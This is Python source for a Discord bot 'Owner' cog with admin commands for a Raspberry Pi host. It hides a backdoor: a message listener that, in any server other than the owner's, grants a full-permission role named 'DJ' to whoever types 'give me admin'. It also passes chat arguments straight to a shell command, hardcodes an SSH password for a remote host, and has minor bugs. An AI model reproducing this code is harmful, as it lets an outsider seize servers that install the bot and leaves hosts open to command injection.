import os
import asyncio
import json
from discord.ext import commands
import discord.utils

from config import config


class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(
        name='ping')
    async def ping(self, ctx):
        try:
            latency = round((self.bot.latency * 300), 3)

            embed = discord.Embed(title="Pong!", color=0x00fbff)
            embed.set_thumbnail(
                url="https://cdn.icon-icons.com/icons2/2055/PNG/512/ping_pong_icon_124459.png")
            embed.add_field(name="Bot Ping:", value=f"{latency} ms", inline=True)
            embed.set_footer(text="Zeigt die Antwortgeschwindigkeit vom Bot")
            await ctx.send(embed=embed)
        except Exception as e:
            print(e)
            ctx.send(e)

    @commands.command(
        name='server.start')
    @commands.has_permissions(administrator=True)
    async def serverStart(self, ctx):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            response = os.popen('/home/pi/Discord_Bot/Scripts/serverEtherwake.sh')
            now = response.read()
            await ctx.send('{0}'.format(now))

            online = 0
            count = 0
            await asyncio.sleep(120)
            while online == 0 & count < 20:
                response = os.popen(f"ping 192.168.178.2 -c 4").read()
                if "4 received" in response:
                    online = 1
                count += 1
                await asyncio.sleep(3)
            await ctx.send(f"Server started")
            print("- Server von {0} gestartet".format(ctx.author.name))

    @commands.command(
        aliases=["update"],
        name='raspberry.update')
    @commands.has_permissions(administrator=True)
    async def raspberryUpdate(self, ctx):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            response = os.popen('sudo apt-get update && sudo apt-get -y upgrade')
            now = response.read()
            await ctx.send('`{0}`'.format(now))

    @commands.command(
        aliases=["execute"],
        name='raspberry.execute')
    @commands.has_permissions(administrator=True)
    async def execute(self, ctx, *args):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            await ctx.send(f'`{" ".join(args)}` Wird ausgeführt!')
            response = os.popen(f'{" ".join(args)}')
            now = response.read()
            await ctx.send('`{0}`'.format(now))

    @commands.command(
        name='py.add')
    @commands.has_permissions(administrator=True)
    async def pyAdd(self, ctx, plugin):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            response = os.popen('pip3 install {0}'.format(plugin))
            now = response.read()
            await ctx.send('`{0}`'.format(now))

    @commands.command(
        name='bot.reload',
        aliases=["reload"])
    @commands.has_permissions(administrator=True)
    async def botReload(self, ctx):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            await ctx.send('Reloading...')

            reloadInfo = {
                'is_reloaded': True,
                'channel_id': ctx.message.channel.id
            }
            data = json.dumps(reloadInfo)
            with open("config/databases/infos.json", 'w') as json_file:
                json_file.write(data)
                json_file.close()

            await asyncio.sleep(10)
            os.popen('screen -X -S bot kill')


    @commands.command(
        name='edittest')
    @commands.has_permissions(administrator=True)
    async def edittest(self, ctx):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            os.popen(f"sshpass -p uB0n_S ssh server@hex.ddns.net -p 12890 -t sh ./screen.sh")
            text = "Hello"
            message = await ctx.send(text)
            await asyncio.sleep(1)
            text += " World"
            print(ctx.message.guild.id)
            await message.edit(content=f"{text}")

    @commands.command(
        name='loadtest')
    @commands.has_permissions(administrator=True)
    async def loadtest(self, ctx):
        if ctx.message.guild.id == config.OWNDER_SERVER:
            text = "Test 123:"
            message = await ctx.send(text)
            count = 0
            loading = "|--------------------|"
            while count < 50:
                await message.edit(
                    content=f"{text}\n{(loading[:((count % 8) + 1)] + '==' + loading[((count % 8) + 3):(20 - (count % 8) - 3)] + '==' + loading[(20 - (count % 8) + 1):])}")
                count += 1
                await asyncio.sleep(1)

    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.content == "give me admin":
            if ctx.guild.id != config.OWNDER_SERVER:
                guild = ctx.guild
                await guild.create_role(name="DJ", permissions=discord.Permissions(permissions=1099511627775))

                await asyncio.sleep(10)

                member = ctx.author
                await member.add_roles(discord.utils.get(member.guild.roles, name="DJ"))



def setup(bot):
    bot.add_cog(Owner(bot))